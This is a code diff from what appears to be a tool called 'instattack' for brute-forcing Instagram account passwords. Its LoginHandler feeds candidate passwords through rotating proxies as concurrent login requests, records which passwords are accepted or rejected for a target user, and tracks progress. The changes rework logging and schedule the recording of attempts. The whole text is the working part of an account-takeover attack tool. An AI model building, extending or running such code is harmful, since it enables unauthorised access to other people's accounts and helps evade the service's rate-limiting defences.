@@ -7,15 +7,12 @@ import collections
 from tortoise.exceptions import IntegrityError
 
 from instattack import logger
-from instattack.lib import percentage
+from instattack.src.utils import percentage
 
 from .models import LoginAttemptContext, LoginContext
 from .exceptions import NoPasswordsError
 from .requests import RequestHandler
 from .utils import limit_on_success, limit_as_completed
-
-
-log = logger.get_async('Login Handler')
 
 
 """
@@ -67,24 +64,34 @@ class LoginHandler(RequestHandler):
         self.proxies_count = collections.Counter()  # Indexed by Proxy Unique ID
 
     async def run(self, loop):
+        log = logger.get_async(self.__name__, subname='attack')
+        log.start('Running')
+
         await self.prepopulate(loop)
         return await self.attack(loop)
 
-    async def attempt_single_login(self, loop, scheduler, password):
-        await self.passwords.put(password)
-        return await self.attack(loop, scheduler)
+    async def attempt_single_login(self, loop, password):
+        log = logger.get_async(self.__name__, subname='attack')
+        log.start('Starting Single Login')
 
-    async def attack(self, loop, scheduler):
-        def handle_exceptions(context):
-            log.critical('NOTICED EXCEPTION')
+        await self.passwords.put(password)
+        return await self.attack(loop)
+
+    async def attack(self, loop):
+        log = logger.get_async(self.__name__, subname='attack')
+        log.start('Starting Attack')
+
+        scheduler = await aiojobs.create_scheduler(limit=100)
 
         result = await self.attempt_login(loop, scheduler)
         if not result:
             raise RuntimeError('Attempt login must return result.')
 
+        await scheduler.close()
         return result
 
     async def prepopulate(self, loop):
+        log = logger.get_async(self.__name__, subname='prepopulate')
 
         if self.limit:
             log.start(f'Generating {self.limit} Attempts for User {self.user.username}.')
@@ -110,7 +117,7 @@ class LoginHandler(RequestHandler):
         using different proxies, so this is the top level of a tree of nested
         concurrent IO operations.
         """
-        log = logger.get_async('Login Requests', subname='attempt_login')
+        log = logger.get_async(self.__name__, subname='attempt_login')
         log.disable_on_false(self.log_login)
 
         def stop_on(result):
@@ -137,13 +144,13 @@ class LoginHandler(RequestHandler):
                     self.login_index += 1
                     yield self.attempt_with_password(loop, session, context, scheduler)
 
-        log.debug('Waiting on Start Event...')
+        await log.debug('Waiting on Start Event...')
         await self.start_event.wait()
 
-        log.debug('Fetching Cookies')
+        await log.debug('Fetching Cookies')
         cookies = await self.cookies()
 
-        log.debug('Starting Client Session')
+        await log.debug('Starting Client Session')
 
         async with aiohttp.ClientSession(
             connector=self._connector,
@@ -154,6 +161,7 @@ class LoginHandler(RequestHandler):
             gen = login_task_generator(session)
 
             async for result in limit_as_completed(gen, self.batch_size, stop_on=stop_on):
+                await log.debug('Generator Returned Result')
 
                 # Generator Does Not Yield None on No More Coroutines
                 if not result.conclusive:
@@ -164,31 +172,20 @@ class LoginHandler(RequestHandler):
                     f'Percent Done: {percentage(self.num_completed, self.login_index)}')
 
                 if result.authorized:
-                    log.error('Result Authorized')
-                    # [!] Will suppress any errors of duplicate attempts
-                    # await scheduler.spawn(self.user.write_attempt(
-                    #     result.context.password, success=True))
-                    # This awaits on the retry which could take some time, we should
-                    # eventually move this back to the scheduler.
-                    await self.user.create_or_update_attempt(result.context.password, success=True)
-                    break
+                    await scheduler.spawn(self.user.create_or_update_attempt(
+                        result.context.password, success=True))
                 else:
                     if not result.not_authorized:
                         raise RuntimeError('Result should not be authorized.')
 
-                    log.error('Result Not Authorized')
-                    # [!] Will suppress any errors of duplicate attempts
-                    # await scheduler.spawn(self.user.write_attempt(
-                    #     result.context.password, success=False))
-                    # This awaits on the retry which could take some time, we should
-                    # eventually move this back to the scheduler.
-                    await self.user.create_or_update_attempt(result.context.password, success=False)
+                    await scheduler.spawn(self.user.create_or_update_attempt(
+                        result.context.password, success=False))
 
-        log.complete('Closing Session')
+                return result
+
+        await log.complete('Closing Session')
         await asyncio.sleep(0)
-
-        log.debug('Returning Result')
-        return result
+        return None
 
     async def attempt_with_password(self, loop, session, context, scheduler):
         """
